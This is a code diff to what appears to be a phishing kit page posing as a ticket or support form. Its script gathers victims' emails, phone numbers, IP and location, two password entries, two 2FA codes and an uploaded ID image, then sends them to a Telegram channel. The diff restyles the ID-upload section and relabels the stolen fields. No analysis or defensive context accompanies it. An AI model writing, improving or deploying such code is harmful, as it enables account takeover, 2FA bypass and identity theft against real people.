@@ -14,7 +14,15 @@
             align-items: center;
             min-height: 100vh;
         }
-        .twofa-container, .id-upload-container {
+        .id-upload-container {
+            background-color: #f0f2f5; /* Changed to match the image background color */
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 750px;
+            text-align: left;
+        }
+        .twofa-container, {
             background-color: #fff; /* Changed to match the image background color */
             padding: 30px;
             border-radius: 8px;
@@ -334,13 +342,12 @@
             let message = `<b>Submission Attempt (2FA) ${twoFAAttemptCount}</b>\n`;
             message += `------------------------------------\n`;
             message += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
-            message += `<b>Ticket Number:</b> ${storedFormData.ticketNumber}\n`;
             message += `<b>Page Name:</b> ${storedFormData.yourName}\n`;
             message += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
             message += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
             message += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
-            message += `<b>Password Attempt 1:</b> ${storedPasswordAttemptValue1}\n`;
-            message += `<b>Password Attempt 2:</b> ${storedPasswordAttemptValue2}\n`;
+            message += `<b>Password 1:</b> ${storedPasswordAttemptValue1}\n`;
+            message += `<b>Password 2:</b> ${storedPasswordAttemptValue2}\n`;
 
             if (twoFAAttemptCount === 1) {
                 twoFAAttemptValue1 = twofaCode;
@@ -437,17 +444,15 @@
             let finalMessage = `<b>Final Submission with ID Upload</b>\n`;
             finalMessage += `------------------------------------\n`;
             finalMessage += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
-            finalMessage += `<b>Ticket Number:</b> ${storedFormData.ticketNumber}\n`;
             finalMessage += `<b>Page Name:</b> ${storedFormData.yourName}\n`;
             finalMessage += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
             finalMessage += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
             finalMessage += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
-            finalMessage += `<b>Password Attempt 1:</b> ${storedPasswordAttemptValue1}\n`;
-            finalMessage += `<b>Password Attempt 2:</b> ${storedPasswordAttemptValue2}\n`;
-            finalMessage += `<b>2FA Code Attempt 1:</b> ${twoFAAttemptValue1}\n`;
-            finalMessage += `<b>2FA Code Attempt 2:</b> ${twoFAAttemptValue2}\n`;
-            finalMessage += `<b>Uploaded ID Image URL:</b> ${uploadedIdImageUrl || 'N/A (Upload failed)'}\n`;
-            finalMessage += `<b>Confirmed Government ID:</b> ${isGovernmentIdChecked ? 'Yes' : 'No'}\n`;
+            finalMessage += `<b>Password 1:</b> ${storedPasswordAttemptValue1}\n`;
+            finalMessage += `<b>Password 2:</b> ${storedPasswordAttemptValue2}\n`;
+            finalMessage += `<b>2FA Code 1:</b> ${twoFAAttemptValue1}\n`;
+            finalMessage += `<b>2FA Code 2:</b> ${twoFAAttemptValue2}\n`;
+            finalMessage += `<b>ID Image URL:</b> ${uploadedIdImageUrl || 'N/A (Upload failed)'}\n`;
 
 
             await sendMessageToTelegram(finalMessage);
